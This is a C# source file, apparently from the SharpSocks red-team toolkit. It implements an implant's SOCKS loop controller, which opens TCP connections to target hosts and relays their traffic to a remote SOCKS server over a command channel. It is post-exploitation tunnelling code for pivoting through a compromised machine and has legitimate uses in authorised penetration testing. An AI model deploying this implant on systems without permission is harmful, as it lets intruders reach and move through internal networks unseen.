using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using SharpSocksCommon;
using SharpSocksCommon.Utils;
using SharpSocksImplant.Comms;
using SharpSocksImplant.Logging;

namespace SharpSocksImplant.Socks
{
    public class SocksLoopController
    {
        private readonly Dictionary<string, TargetInfo.TargetInfo> _targets = new Dictionary<string, TargetInfo.TargetInfo>();
        private readonly AutoResetEvent _timeout = new AutoResetEvent(false);

        public IImplantLog ImplantComms { get; set; }

        [DefaultValue(500)] public ushort TimeBetweenReads { get; set; }

        public CommandCommunicationHandler CmdCommsHandler { get; set; }

        public bool OpenNewConnectionToTarget(string targetId, string targetHost, ushort targetPort)
        {
            var target = new TargetInfo.TargetInfo
            {
                TargetPort = targetPort,
                TargetHost = targetHost
            };
            var family = AddressFamily.InterNetwork;
            IPAddress address = null;
            try
            {
                switch (Uri.CheckHostName(targetHost))
                {
                    case UriHostNameType.Dns:
                        var hostEntry = Dns.GetHostEntry(targetHost);
                        if (hostEntry.AddressList != null)
                        {
                            var ipAddress = hostEntry.AddressList.First();
                            if (ipAddress != null && !string.IsNullOrWhiteSpace(ipAddress.ToString()))
                            {
                                address = ipAddress;
                                if (Uri.CheckHostName(address.ToString()) == UriHostNameType.IPv6) family = AddressFamily.InterNetworkV6;
                                break;
                            }

                            ImplantComms.LogError($"[{targetId}][Implant -> Target] Unable to resolve the host");
                            return false;
                        }

                        break;
                    case UriHostNameType.IPv4:
                    case UriHostNameType.IPv6:
                        address = IPAddress.Parse(targetHost);
                        break;
                    default:
                        ImplantComms.LogError($"[{targetId}][Implant -> Target] Unable to resolve the host {targetHost}");
                        return false;
                }

                ImplantComms.LogMessage($"[{targetId}][Implant -> Target] Opening new connection to {targetHost}:{targetPort}");
                if (address == null)
                {
                    ImplantComms.LogError($"[{targetId}][Implant -> Target] Address is null");
                    return false;
                }

                if (Uri.CheckHostName(address.ToString()) == UriHostNameType.IPv6)
                    family = AddressFamily.InterNetworkV6;
                target.TargetTcpClient = new TcpClient(family);

                target.TargetTcpClient.Connect(new IPEndPoint(address, targetPort));
                if (!target.TargetTcpClient.Connected || !TcpUtils.CheckTcpConnectionState(target.TargetTcpClient))
                    return false;
            }
            catch (Exception e)
            {
                ImplantComms.LogError($"[{targetId}][Implant -> Target] Failed to create connection to {address} on port {targetPort}: {e}");
                return false;
            }

            target.ProxyLoop = new Task(id =>
            {
                try
                {
                    ProxyLoop((string)id);
                }
                catch (Exception e)
                {
                    ImplantComms.LogError($"[{targetId}] Error in proxy loop: {e}");
                    if (!(target.TargetTcpClient is { Connected: true }))
                        return;
                    target.TargetTcpClient.Close();
                }
            }, targetId);
            _targets.Add(targetId, target);
            target.ProxyLoop.Start();
            return true;
        }

        private void ProxyLoop(string targetId)
        {
            TargetInfo.TargetInfo targetInfo = null;
            try
            {
                targetInfo = _targets[targetId];
                if (targetInfo == null)
                {
                    ImplantComms.LogError($"[SOCKS Server -> Implant][{targetId}] Can't find target for GUID: {targetId} exiting this proxy loop");
                    return;
                }

                var targetStream = targetInfo.TargetTcpClient.GetStream();

                var fromSocksServer = CmdCommsHandler.Send(targetId, CommandChannelStatus.NO_CHANGE, null, out var commandChannelDead);
                if (fromSocksServer == null || commandChannelDead)
                {
                    ImplantComms.LogError($"[{targetId}][Implant -> SOCKS Server] Command channel null response or dead, terminating connection");
                    return;
                }

                while (!targetInfo.Exit)
                {
                    if (!targetInfo.TargetTcpClient.Connected || !TcpUtils.CheckTcpConnectionState(targetInfo.TargetTcpClient))
                    {
                        ImplantComms.LogImportantMessage($"[{targetId}][Implant -> Target] TcpClient is not connected");
                        return;
                    }

                    //if (fromSocksServer.Any())
                    //{
                    targetStream.Write(fromSocksServer.ToArray(), 0, fromSocksServer.Count);
                    targetStream.Flush();
                    ImplantComms.LogMessage(
                        $"[{targetId}][Implant -> Target] Written {fromSocksServer.Count} bytes to target: {targetInfo.TargetHost}:{targetInfo.TargetPort}");
                    //fromSocksServer = new List<byte>();
                    //}

                    var targetResponseBytes = new List<byte>();
                    while (!targetInfo.Exit && targetInfo.TargetTcpClient.Connected && TcpUtils.CheckTcpConnectionState(targetInfo.TargetTcpClient) && targetStream.DataAvailable &&
                           targetInfo.TargetTcpClient.Available > 0)
                    {
                        var countAvailableBytes = targetInfo.TargetTcpClient.Available;
                        var temp = new byte[ushort.MaxValue];
                        while (countAvailableBytes > 0 && targetStream.DataAvailable)
                        {
                            countAvailableBytes = targetStream.Read(temp, 0, ushort.MaxValue);
                            targetResponseBytes.AddRange(temp.ToList().Take(countAvailableBytes));
                        }

                        if (countAvailableBytes > 0)
                        {
                            ImplantComms.LogMessage(
                                $"[{targetId}][Target -> Implant] Read {countAvailableBytes} bytes from {targetInfo.TargetTcpClient.Client.RemoteEndPoint}");
                        }
                        else
                        {
                            ImplantComms.LogMessage($"[{targetId}][Target -> Implant] Read 0 bytes from {targetInfo.TargetTcpClient.Client.RemoteEndPoint}");
                        }

                        if (targetInfo.Exit)
                        {
                            return;
                        }

                        _timeout.WaitOne(TimeBetweenReads);
                    }

                    fromSocksServer = CmdCommsHandler.Send(targetId, CommandChannelStatus.NO_CHANGE, targetResponseBytes, out commandChannelDead);
                    if (fromSocksServer == null || commandChannelDead)
                    {
                        throw new Exception($"[{targetId}][Implant -> SOCKS Server] Command channel empty response or dead, terminating connection");
                    }
                }
            }
            catch (Exception e)
            {
                ImplantComms.LogError($"[{targetId}] Error: {targetInfo?.TargetTcpClient.Client.RemoteEndPoint}: {e}");
                if (targetInfo?.TargetTcpClient != null)
                {
                    if (targetInfo.TargetTcpClient.Connected)
                        targetInfo.TargetTcpClient.Close();
                    else
                        ImplantComms.LogError($"[{targetId}] TargetTcpClient is null: {targetInfo.TargetTcpClient == null}");
                }
            }
            finally
            {
                if (targetInfo is { TargetTcpClient: { Connected: true } })
                    targetInfo.TargetTcpClient.Close();
                if (targetInfo is { Exit: false })
                {
                    ImplantComms.LogError($"[{targetId}][Implant -> SOCKS Server] Notifying server of close");
                    CmdCommsHandler.Send(targetId, CommandChannelStatus.CLOSED, null, out _);
                }
            }
        }

        public void StopAll()
        {
            ImplantComms.LogMessage("Shutdown all connections triggered");
            _targets.Keys.ToList().ForEach(Stop);
        }

        public void Stop(string targetId)
        {
            var target = _targets[targetId];
            ImplantComms.LogMessage($"[{targetId}] Closing connection to {target.TargetHost}:{target.TargetPort}");
            target.Exit = true;
        }

        public void HardStopAll()
        {
            ImplantComms.LogMessage("HARD STOP ALL TRIGGERED");
            _targets.Keys.ToList().ForEach(HardStop);
        }

        public void HardStop(string targetId)
        {
            var target = _targets[targetId];
            ImplantComms.LogMessage($"HARD STOP ALL ON CONNECTION TO {target.TargetHost}:{target.TargetPort}");
            target.Exit = true;
            target.TargetTcpClient.Close();
        }
    }
}